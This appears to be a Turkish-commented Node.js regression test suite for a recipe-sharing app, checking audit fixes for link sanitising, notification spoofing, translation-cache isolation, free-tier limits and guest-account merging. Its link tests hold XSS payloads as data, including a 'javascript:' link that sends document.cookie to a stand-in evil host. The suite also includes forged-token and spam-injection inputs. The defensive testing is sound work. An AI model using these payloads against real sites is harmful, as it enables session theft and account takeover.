// Grup 5 — Fable denetimi (a094372) bulgularının regresyon testleri.
// Hepsi bellek içi Redis + sahte Firebase/Anthropic/FCM; gerçek ağ/ücret yok.
import test from "node:test";
import assert from "node:assert/strict";
import crypto from "node:crypto";
import { setRoutes, calls, invoke, resetDb, json, db, idToken, signedToken } from "./helpers/fakeServices.mjs";

{
  const { privateKey } = crypto.generateKeyPairSync("rsa", { modulusLength: 2048 });
  process.env.FIREBASE_SERVICE_ACCOUNT_KEY = JSON.stringify({
    client_email: "test@tarif-kutusu.test",
    project_id: "tarif-kutusu",
    private_key: privateKey.export({ format: "pem", type: "pkcs8" }),
  });
}

const { safeRecipeLink } = await import("../shared/safeLink.js");
const { default: dataHandler } = await import("../api/data.js");
const { default: notify } = await import("../api/notify.js");
const { default: fcmToken } = await import("../api/fcm-token.js");
const { default: translate } = await import("../api/translate-recipe.js");
const { default: account } = await import("../api/account.js");
const { default: profileHandler } = await import("../api/profile.js");
const { default: families } = await import("../api/families.js");
const { getProfile } = await import("../api/_lib/profile.js");
const { deleteAccount } = await import("../api/_lib/accountDeletion.js");
const { familyDataKeys } = await import("../api/_lib/families.js");
const { __setNotifyClockForTests, NOTIFY_LIMITS, notificationTitle } = await import("../api/_lib/notifyGuard.js");
const { MAX_RECIPE_CHARS } = await import("../api/_lib/recipeInput.js");
const { saveRecipeToTargets, extractionSignature } = await import("../src/saveTargets.js");
const { FREE_RECIPE_LIMIT } = await import("../shared/limits.js");

const ANTHROPIC = "https://api.anthropic.com/v1/messages";
const FCM_SEND = "https://fcm.googleapis.com/v1/projects/tarif-kutusu/messages:send";
let fcmSent = [];
let anthropicMode = "identity";

function anthropic(url, init) {
  const body = JSON.parse(init.body);
  const text = body.messages[0].content[0].text.replace(/^<recipe>\n/, "").replace(/\n<\/recipe>$/, "");
  const data = JSON.parse(text);
  let out;
  if (data.titles) out = { titles: data.titles.map((t) => (anthropicMode === "inject" ? "REKLAM: bit.ly/x" : `EN ${t}`)) };
  else out = { ...data, title: anthropicMode === "inject" ? "REKLAM: bit.ly/x" : `EN ${data.title}` };
  return json(200, { stop_reason: "end_turn", content: [{ type: "text", text: JSON.stringify(out) }], usage: { output_tokens: 5 } });
}

function reset() {
  resetDb();
  fcmSent = [];
  anthropicMode = "identity";
  __setNotifyClockForTests(() => Date.UTC(2026, 10, 13, 10, 0, 0));
  setRoutes([
    [ANTHROPIC, anthropic],
    ["https://oauth2.googleapis.com/token", () => json(200, { access_token: "fcm-access", expires_in: 3600 })],
    [FCM_SEND, (url, init) => {
      fcmSent.push(JSON.parse(init.body).message);
      return json(200, { name: "projects/x/messages/1" });
    }],
  ]);
}

const writeList = (uid, scope, list, baseVersion, extra = {}) =>
  invoke(dataHandler, { method: "POST", uid, body: { bucket: "recipes", scope, value: JSON.stringify(list), baseVersion, ...extra } });
const readList = (key) => JSON.parse(db.get(key) || "null");
const recipe = (id, extra = {}) => ({ id, title: `Tarif ${id}`, ingredients: [], instructions: [], ...extra });

function seedFamily(members, { plus = true, recipes = [recipe("r1", { title: "Menemen" })] } = {}) {
  for (const uid of members) db.set(`user:${uid}:profile`, JSON.stringify({ isPlus: plus, families: ["F1"] }));
  db.set("family:F1:meta", JSON.stringify({ name: "Ev", ownerUid: members[0], inviteCode: "ABCDEFGHJK" }));
  db.set("family:F1:members", JSON.stringify(Object.fromEntries(members.map((uid, i) => [uid, { name: `Ad-${uid}`, joinedAt: i + 1 }]))));
  db.set("family:F1:recipes", JSON.stringify(recipes));
}

// ============ 1. Tarif linki ============

test("Link 1: yalnızca kimlik bilgisiz http(s); javascript/data/intent/kontrol karakterli şemalar boş döner", () => {
  for (const bad of [
    "javascript:alert(1)",
    "JAVASCRIPT:alert(document.cookie)",
    " javascript:alert(1)",
    "java\tscript:alert(1)",
    "java\nscript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "intent://scan/#Intent;scheme=zxing;end",
    "file:///etc/passwd",
    "//evil.example",
    "https://user:pass@evil.example/",
    "https://",
    "x".repeat(10),
    "https://a.example/" + "x".repeat(3000),
    null,
    { href: "https://x" },
  ]) {
    assert.equal(safeRecipeLink(bad), "", JSON.stringify(bad));
  }
  assert.equal(safeRecipeLink("https://www.tiktok.com/@sef/video/1"), "https://www.tiktok.com/@sef/video/1");
  assert.equal(safeRecipeLink("  http://blog.example/tarif "), "http://blog.example/tarif");
});

test("Link 2: aile üyesi javascript: linkli tarif yazarsa link sunucuda silinir; tarif kaydedilir", async () => {
  reset();
  seedFamily(["A", "B"], { recipes: [] });
  const r = await writeList("A", "family", [recipe("x1", { link: "javascript:fetch('//evil/'+document.cookie)" })], 1, { familyId: "F1" });
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.equal(r.body.sanitizedLinks, 1);
  const stored = readList("family:F1:recipes");
  assert.equal(stored[0].id, "x1");
  assert.equal("link" in stored[0], false);
  // B okur: güvensiz link hiç gelmez.
  const read = await invoke(dataHandler, { method: "GET", uid: "B", query: { bucket: "recipes", scope: "family", familyId: "F1" } });
  assert.equal(JSON.stringify(read.body).includes("javascript"), false);
});

test("Link 3: değişmemiş eski kayıttaki güvensiz link listenin başka yerindeki yazımı engellemez; dokunulunca temizlenir", async () => {
  reset();
  const legacy = recipe("old", { link: "javascript:alert(1)" });
  db.set("user:A:recipes", JSON.stringify([legacy]));
  db.set("user:A:profile", JSON.stringify({ isPlus: true, families: [] }));
  const add = await writeList("A", "personal", [recipe("new", { link: "https://www.youtube.com/watch?v=1" }), legacy], 1);
  assert.equal(add.status, 200, JSON.stringify(add.body));
  assert.equal(add.body.sanitizedLinks, undefined, "dokunulmayan eski kayıt olduğu gibi");
  assert.equal(readList("user:A:recipes")[0].link, "https://www.youtube.com/watch?v=1");
  const edit = await writeList("A", "personal", [readList("user:A:recipes")[0], { ...legacy, title: "Yeni ad" }], add.body.version);
  assert.equal(edit.status, 200);
  assert.equal("link" in readList("user:A:recipes")[1], false, "düzenlenen eski kayıtta güvensiz link silindi");
});

test("Boyut: yeni/değişen tek tarif sınırı aşarsa 413, kimliksiz tarif 400; sınırdaki eski kayıt yazımı engellemez", async () => {
  reset();
  db.set("user:A:profile", JSON.stringify({ isPlus: true, families: [] }));
  const huge = recipe("big", { instructions: ["x".repeat(MAX_RECIPE_CHARS)] });
  const r = await writeList("A", "personal", [huge], 0);
  assert.equal(r.status, 413);
  assert.equal(r.body.code, "recipe_too_large");
  assert.equal(db.has("user:A:recipes"), false);
  const noId = await writeList("A", "personal", [{ title: "kimliksiz" }], 0);
  assert.equal(noId.status, 400);
  assert.equal(noId.body.code, "invalid_recipe");
  // Sınırdan önce yazılmış büyük kayıt: başka tarif eklemek engellenmez.
  db.set("user:A:recipes", JSON.stringify([huge]));
  const ok = await writeList("A", "personal", [recipe("small"), huge], 1);
  assert.equal(ok.status, 200);
});

// ============ 2. "Canım çekti" bildirimi ============

async function androidDevice(uid, token) {
  const r = await invoke(fcmToken, { uid, body: { token, platform: "android", installationId: `install-android-${uid}` } });
  assert.equal(r.status, 200, JSON.stringify(r.body));
}

test("Bildirim 1: gönderen adı sunucudaki üye kaydından, başlık ailenin kayıtlı tarifinden; istemcinin adı/başlığı yok sayılır", async () => {
  reset();
  seedFamily(["A", "B"], { recipes: [recipe("r1", { title: "Menemen" })] });
  await androidDevice("B", "android-token-of-b-aaaaaaaaaaaaaaaa");
  const r = await invoke(notify, { uid: "A", body: { familyId: "F1", recipeId: "r1", recipeTitle: "Bedava para için tıkla", senderName: "Banka" } });
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.equal(r.body.sent, 1);
  const body = fcmSent[0].notification?.body || fcmSent[0].data?.body || JSON.stringify(fcmSent[0]);
  assert.match(body, /Ad-A/);
  assert.match(body, /Menemen/);
  assert.doesNotMatch(body, /Banka|Bedava/);
});

test("Bildirim 2: ailede olmayan tarif kimliğiyle serbest metin gönderilemez (404, FCM'e gidilmez)", async () => {
  reset();
  seedFamily(["A", "B"]);
  await androidDevice("B", "android-token-of-b-aaaaaaaaaaaaaaaa");
  const r = await invoke(notify, { uid: "A", body: { familyId: "F1", recipeId: "yok", recipeTitle: "Spam" } });
  assert.equal(r.status, 404);
  assert.equal(r.body.code, "recipe_not_found");
  const noId = await invoke(notify, { uid: "A", body: { familyId: "F1", recipeTitle: "Spam" } });
  assert.equal(noId.status, 400);
  assert.equal(fcmSent.length, 0);
});

test("Bildirim 3: uzun ve çok satırlı başlık kesilir; kontrol karakterleri temizlenir", async () => {
  const LS = String.fromCharCode(0x2028);
  const t = notificationTitle(`Sarma\n\n${LS}${"ç".repeat(200)}`);
  assert.equal([...t].length, 80);
  assert.ok(t.endsWith("…"));
  assert.ok(!t.includes("\n") && !t.includes(LS));
  reset();
  seedFamily(["A", "B"], { recipes: [recipe("r1", { title: "x".repeat(5000) })] });
  await androidDevice("B", "android-token-of-b-aaaaaaaaaaaaaaaa");
  const r = await invoke(notify, { uid: "A", body: { familyId: "F1", recipeId: "r1" } });
  assert.equal(r.status, 200);
  const body = JSON.stringify(fcmSent[0]);
  assert.ok(body.length < 2000, `bildirim gövdesi sınırlı (${body.length})`);
});

test("Bildirim 4: aynı tarif art arda → 429 (Retry-After); farklı tarifler saatlik sınıra kadar geçer, sonra 429", async () => {
  reset();
  const recipes = Array.from({ length: 15 }, (_, i) => recipe(`r${i}`, { title: `Yemek ${i}` }));
  seedFamily(["A", "B"], { recipes });
  const send = (id) => invoke(notify, { uid: "A", body: { familyId: "F1", recipeId: id } });
  assert.equal((await send("r0")).status, 200);
  const dup = await send("r0");
  assert.equal(dup.status, 429);
  assert.equal(dup.body.code, "notify_rate_limited");
  assert.ok(Number(dup.headers["retry-after"]) > 0);
  const statuses = [];
  for (let i = 1; i < 15; i++) statuses.push((await send(`r${i}`)).status);
  // r0 + r1..r14: saatlik sayaç 10'da durur. Aynı-tarif reddi (dup) artık
  // hiçbir sayacı artırmaz (Grup 5 B4).
  const okCount = statuses.filter((s) => s === 200).length;
  assert.equal(okCount + 1, NOTIFY_LIMITS.senderHourly, JSON.stringify(statuses));
  assert.ok(statuses.slice(-3).every((s) => s === 429));
  // Bir saat sonra yeniden açılır (aynı tarif beklemesi ayrı, 10 dk).
  __setNotifyClockForTests(() => Date.UTC(2026, 10, 13, 11, 0, 5));
  assert.equal((await send("r5")).status, 429, "r5 zaten gönderilmişti ve 10 dk beklemesi Redis TTL'iyle sürüyor");
  assert.equal((await send("r14")).status, 200);
});

test("Bildirim 5: aile başı saatlik tavan birden çok gönderende de geçerli", async () => {
  reset();
  const members = Array.from({ length: 6 }, (_, i) => `M${i}`);
  const recipes = Array.from({ length: 10 }, (_, i) => recipe(`r${i}`));
  seedFamily(members, { recipes });
  let ok = 0;
  for (const uid of members) for (let i = 0; i < 9; i++) if ((await invoke(notify, { uid, body: { familyId: "F1", recipeId: `r${i}` } })).status === 200) ok++;
  assert.equal(ok, NOTIFY_LIMITS.familyHourly);
});

// ============ 3. Çeviri önbelleği ============

test("Çeviri 1: bir kullanıcının ürettiği başlık çevirisi aynı başlığa sahip BAŞKA kullanıcıya gösterilmez", async () => {
  reset();
  db.set("user:EVIL:recipes", JSON.stringify([recipe("e1", { title: "Mercimek Çorbası" })]));
  db.set("user:VICTIM:recipes", JSON.stringify([recipe("v1", { title: "Mercimek Çorbası" })]));
  anthropicMode = "inject";
  const evil = await invoke(translate, { uid: "EVIL", body: { mode: "titles", target: "en" } });
  assert.equal(evil.body.titles["Mercimek Çorbası"], "REKLAM: bit.ly/x");
  anthropicMode = "identity";
  const victim = await invoke(translate, { uid: "VICTIM", body: { mode: "titles", target: "en" } });
  assert.equal(victim.body.titles["Mercimek Çorbası"], "EN Mercimek Çorbası");
  // Tam tarif çevirisi de sahibe göre.
  anthropicMode = "inject";
  await invoke(translate, { uid: "EVIL", body: { recipeId: "e1", scope: "personal", target: "en" } });
  anthropicMode = "identity";
  const full = await invoke(translate, { uid: "VICTIM", body: { recipeId: "v1", scope: "personal", target: "en" } });
  assert.equal(full.body.cached, false);
  assert.equal(full.body.translation.title, "EN Mercimek Çorbası");
  assert.equal([...db.keys()].some((k) => k.startsWith("rt:") || k.startsWith("rt-titles:")), false, "ortak önbellek anahtarı yazılmaz");
});

test("Çeviri 2: aynı ailenin üyeleri ortak önbelleği kullanır (Claude'a bir kez); aile silinince önbellek de silinir", async () => {
  reset();
  seedFamily(["A", "B"], { recipes: [recipe("f1", { title: "Karnıyarık" })] });
  const a = await invoke(translate, { uid: "A", body: { recipeId: "f1", scope: "F1", target: "en" } });
  assert.equal(a.body.cached, false);
  const b = await invoke(translate, { uid: "B", body: { recipeId: "f1", scope: "F1", target: "en" } });
  assert.equal(b.body.cached, true);
  assert.equal(calls.filter((c) => c.url === ANTHROPIC).length, 1);
  assert.ok(db.has("family:F1:translations:en"));
  assert.ok(familyDataKeys("F1").includes("family:F1:translations:en"));
});

test("Çeviri 3: hesap silinince kullanıcının çeviri önbelleği de silinir", async () => {
  reset();
  setRoutes([
    [ANTHROPIC, anthropic],
    ["https://oauth2.googleapis.com/token", () => json(200, { access_token: "x", expires_in: 3600 })],
    ["https://identitytoolkit.googleapis.com/", () => json(200, {})],
  ]);
  db.set("user:A:recipes", JSON.stringify([recipe("a1", { title: "Pilav" })]));
  await invoke(translate, { uid: "A", body: { recipeId: "a1", scope: "personal", target: "en" } });
  assert.ok(db.has("user:A:translations:en"));
  await deleteAccount("A");
  assert.equal(db.has("user:A:translations:en"), false);
});

// ============ 4. Free sınırı ve "geri al" ============

async function freeUserWith(uid, n) {
  db.set(`user:${uid}:profile`, JSON.stringify({ isPlus: false, families: [] }));
  const list = Array.from({ length: n }, (_, i) => recipe(`${uid}-${i}`));
  const r = await writeList(uid, "personal", list, 0);
  // n > sınır ise doğrudan yaz (sınırdan önceki eski hesap).
  if (r.status !== 200) {
    db.set(`user:${uid}:recipes`, JSON.stringify(list));
    db.set(`user:${uid}:recipes:version`, "1");
    return { list, version: 1 };
  }
  return { list, version: r.body.version };
}

test("Sınır 1: sınırdayken sil → yeni ekle → geri al ile sınır AŞILAMAZ", async () => {
  reset();
  let { list, version } = await freeUserWith("F", FREE_RECIPE_LIMIT);
  const removed = list[0];
  let r = await writeList("F", "personal", list.slice(1), version);
  assert.equal(r.status, 200);
  r = await writeList("F", "personal", [recipe("F-new"), ...list.slice(1)], r.body.version);
  assert.equal(r.status, 200, "yer açıldı, yeni tarif eklenir");
  r = await writeList("F", "personal", [removed, recipe("F-new"), ...list.slice(1)], r.body.version);
  assert.equal(r.status, 403, "geri al sınırın üstüne çıkaramaz");
  assert.equal(r.body.code, "free_recipe_limit");
  assert.equal(readList("user:F:recipes").length, FREE_RECIPE_LIMIT);
});

test("Sınır 2: geri al istisnası id'yi yeniden kullanıp YENİ içerik ekleyemez", async () => {
  reset();
  let { list, version } = await freeUserWith("G", FREE_RECIPE_LIMIT + 3); // eski, sınır üstü hesap
  const removed = list[0];
  let r = await writeList("G", "personal", list.slice(1), version);
  assert.equal(r.status, 200);
  const forged = { ...removed, title: "Bambaşka tarif", instructions: ["yeni içerik"] };
  r = await writeList("G", "personal", [forged, ...list.slice(1)], r.body.version);
  assert.equal(r.status, 403);
});

test("Sınır 3: sınırın üstündeki eski hesap (fazlalar kilitli) gerçek silmeyi geri alabilir; düzenleme/silme serbest", async () => {
  reset();
  let { list, version } = await freeUserWith("H", FREE_RECIPE_LIMIT + 3);
  let r = await writeList("H", "personal", list.slice(2), version);
  assert.equal(r.status, 200, "iki silme");
  r = await writeList("H", "personal", [list[0], list[1], ...list.slice(2)], r.body.version);
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.equal(readList("user:H:recipes").length, FREE_RECIPE_LIMIT + 3);
  r = await writeList("H", "personal", readList("user:H:recipes").map((x, i) => (i === 0 ? { ...x, title: "düzenlendi" } : x)), r.body.version);
  assert.equal(r.status, 200);
  r = await writeList("H", "personal", [recipe("H-yeni"), ...readList("user:H:recipes")], r.body.version);
  assert.equal(r.status, 403, "sınır üstünde yeni tarif yok");
});

test("Sınır 4: eski sunucunun 'geri al' anahtarına (yalnızca id dizisi) dokunulmaz", async () => {
  reset();
  let { list, version } = await freeUserWith("K", FREE_RECIPE_LIMIT);
  await writeList("K", "personal", list.slice(1), version);
  assert.equal(db.has("user:K:recentlyRemovedRecipes"), false);
  assert.ok(db.has("user:K:recentlyRemovedRecipes:v2"));
});

// ============ 5. Profil sağlamlığı ============

test("Profil: eksik/yanlış türde alanlar güvenli varsayılana tamamlanır; bozuk JSON 502; uçlar 500 vermez", async () => {
  reset();
  for (const [raw, expected] of [
    [JSON.stringify({ isPlus: true }), { isPlus: true, families: [] }],
    [JSON.stringify({ families: "F1" }), { isPlus: false, families: [] }],
    [JSON.stringify({ isPlus: "true", families: ["F1", 3, null, ""] }), { isPlus: false, families: ["F1"] }],
    ["null", { isPlus: false, families: [] }],
  ]) {
    db.set("user:P:profile", raw);
    const p = await getProfile("P");
    assert.deepEqual({ isPlus: p.isPlus, families: p.families }, expected, raw);
    const g = await invoke(families, { method: "GET", uid: "P" });
    assert.notEqual(g.status, 500, raw);
    const prof = await invoke(profileHandler, { method: "GET", uid: "P" });
    assert.equal(prof.status, 200, raw);
  }
  db.set("user:P:profile", "{bozuk");
  await assert.rejects(getProfile("P"), (e) => e.status === 502 && e.code === "profile_unreadable");
});

test("Profil: bozuk profil hesap silmeyi engellemez", async () => {
  reset();
  setRoutes([
    ["https://oauth2.googleapis.com/token", () => json(200, { access_token: "x", expires_in: 3600 })],
    ["https://identitytoolkit.googleapis.com/", () => json(200, {})],
  ]);
  const { log, warn } = console;
  console.log = () => {};
  console.warn = () => {};
  try {
    db.set("user:P:profile", "{bozuk");
    db.set("user:P:recipes", "[]");
    await deleteAccount("P");
  } finally {
    Object.assign(console, { log, warn });
  }
  assert.equal(db.has("user:P:recipes"), false);
  assert.equal(db.has("user:P:profile"), false);
});

// ============ 6. Çoklu hedefe kayıt ============

test("Çoklu hedef: kısmi başarıda başarılı/başarısız hedefler ayrı döner; tekrar yalnız eksik hedefe, kopya oluşmaz", async () => {
  const lists = { personal: [], F1: [], F2: [] };
  let failF2 = true;
  const mutate = async (key, updater) => {
    if (key === "F2" && failF2) throw Object.assign(new Error("ağ"), { code: "network" });
    lists[key] = updater(lists[key]);
  };
  const r = { id: "same-id", title: "T" };
  const first = await saveRecipeToTargets(r, ["personal", "F1", "F2"], mutate, "personal");
  assert.deepEqual(first.saved, ["personal", "F1"]);
  assert.deepEqual(first.failed.map((f) => f.scopeKey), ["F2"]);
  failF2 = false;
  const retry = await saveRecipeToTargets(r, ["personal", "F1", "F2"], mutate, "personal");
  assert.deepEqual(retry.failed, []);
  assert.deepEqual([lists.personal.length, lists.F1.length, lists.F2.length], [1, 1, 1], "aynı id tekrar eklenmez");
});

test("Çoklu hedef: kişisel liste Free sınırına takılsa da aileler denenir", async () => {
  const lists = { personal: [], F1: [] };
  const mutate = async (key, updater) => {
    if (key === "personal") throw Object.assign(new Error("limit"), { code: "free_recipe_limit" });
    lists[key] = updater(lists[key]);
  };
  const out = await saveRecipeToTargets({ id: "x" }, ["personal", "F1"], mutate, "personal");
  assert.deepEqual(out.saved, ["F1"]);
  assert.equal(out.failed[0].error.code, "free_recipe_limit");
});

test("Çoklu hedef: aynı girdiler aynı imzayı üretir (yeniden AI çağrısı yok), girdi değişince imza değişir", () => {
  const base = { link: "https://x.example/a ", caption: "c", notes: "", images: [], category: "Kahvaltı", language: "tr" };
  assert.equal(extractionSignature(base), extractionSignature({ ...base, link: "https://x.example/a" }));
  assert.notEqual(extractionSignature(base), extractionSignature({ ...base, caption: "d" }));
  assert.notEqual(extractionSignature(base), extractionSignature({ ...base, category: "Tatlı" }));
});

// ============ 7. Misafir → mevcut hesap ============

const guestToken = (uid) => idToken(uid, { anonymous: true });
const merge = (uid, token) => invoke(account, { method: "POST", uid, body: { action: "mergeGuest", guestToken: token } });

test("Misafir 1: misafirin tarifleri, kileri ve (boşsa) alışveriş listesi mevcut hesaba taşınır; tekrar çağrı kopya üretmez", async () => {
  reset();
  db.set("user:GUEST:recipes", JSON.stringify([recipe("g1"), recipe("g2", { link: "javascript:alert(1)" }), recipe("shared")]));
  db.set("user:GUEST:pantry-items", JSON.stringify(["un", "şeker"]));
  db.set("user:GUEST:shopping-list", JSON.stringify({ items: ["süt"] }));
  db.set("user:REAL:recipes", JSON.stringify([recipe("shared"), recipe("r1")]));
  db.set("user:REAL:pantry-items", JSON.stringify(["un"]));
  const r = await merge("REAL", guestToken("GUEST"));
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.deepEqual({ recipes: r.body.recipes, pantry: r.body.pantry, shoppingList: r.body.shoppingList }, { recipes: 2, pantry: 1, shoppingList: "copied" });
  const ids = readList("user:REAL:recipes").map((x) => x.id);
  assert.deepEqual(ids, ["shared", "r1", "g1", "g2"]);
  assert.equal("link" in readList("user:REAL:recipes")[3], false, "taşınan güvensiz link temizlenir");
  assert.deepEqual(readList("user:REAL:pantry-items"), ["un", "şeker"]);
  assert.deepEqual(readList("user:REAL:shopping-list"), { items: ["süt"] });
  const again = await merge("REAL", guestToken("GUEST"));
  assert.equal(again.status, 200);
  assert.equal(readList("user:REAL:recipes").length, 4);
  // Grup 5 B2: taşıma bitince misafir kopyası silinir (eskiden kalıyordu).
  assert.equal(db.has("user:GUEST:recipes"), false, "taşıma bitince misafir kopyası silinir");
});

test("Misafir 2: dolu alışveriş listesi ezilmez; Free sınırına bakılmaz (veri kaybı yok)", async () => {
  reset();
  db.set("user:REAL:profile", JSON.stringify({ isPlus: false, families: [] }));
  db.set("user:REAL:recipes", JSON.stringify(Array.from({ length: FREE_RECIPE_LIMIT }, (_, i) => recipe(`r${i}`))));
  db.set("user:REAL:shopping-list", JSON.stringify({ items: ["ekmek"] }));
  db.set("user:GUEST:recipes", JSON.stringify([recipe("g1")]));
  db.set("user:GUEST:shopping-list", JSON.stringify({ items: ["süt"] }));
  const r = await merge("REAL", guestToken("GUEST"));
  assert.equal(r.status, 200);
  assert.equal(r.body.shoppingList, "kept_existing");
  assert.deepEqual(readList("user:REAL:shopping-list"), { items: ["ekmek"] });
  assert.equal(readList("user:REAL:recipes").length, FREE_RECIPE_LIMIT + 1);
});

test("Misafir 3: yalnızca gerçek misafir token'ı; başka hesabın (anonim olmayan) verisi çekilemez; bir misafir tek hesaba taşınır", async () => {
  reset();
  db.set("user:OTHER:recipes", JSON.stringify([recipe("secret")]));
  const notGuest = await merge("ATTACKER", idToken("OTHER"));
  assert.equal(notGuest.status, 400);
  assert.equal(notGuest.body.code, "not_guest");
  const forged = await merge("ATTACKER", signedToken({ sub: "OTHER", firebase: { sign_in_provider: "anonymous" } }, { foreign: true }));
  assert.equal(forged.status, 400);
  assert.equal(forged.body.code, "guest_token_invalid");
  const self = await merge("GUEST", guestToken("GUEST"));
  assert.equal(self.body.code, "same_account");
  assert.equal(db.has("user:ATTACKER:recipes"), false);

  db.set("user:GUEST:recipes", JSON.stringify([recipe("g1")]));
  assert.equal((await merge("REAL1", guestToken("GUEST"))).status, 200);
  const second = await merge("REAL2", guestToken("GUEST"));
  assert.equal(second.status, 409);
  assert.equal(second.body.code, "guest_already_merged");
  assert.equal(db.has("user:REAL2:recipes"), false);
});

test("Misafir 4: geçersiz gövde 400, silinmiş hedef hesap 401 (taşıma yapılmaz)", async () => {
  reset();
  assert.equal((await invoke(account, { method: "POST", uid: "REAL", body: {} })).status, 400);
  db.set("deleted-account:REAL", "1");
  db.set("user:GUEST:recipes", JSON.stringify([recipe("g1")]));
  const r = await merge("REAL", guestToken("GUEST"));
  assert.equal(r.status, 401);
  assert.equal(db.has("user:REAL:recipes"), false);
});
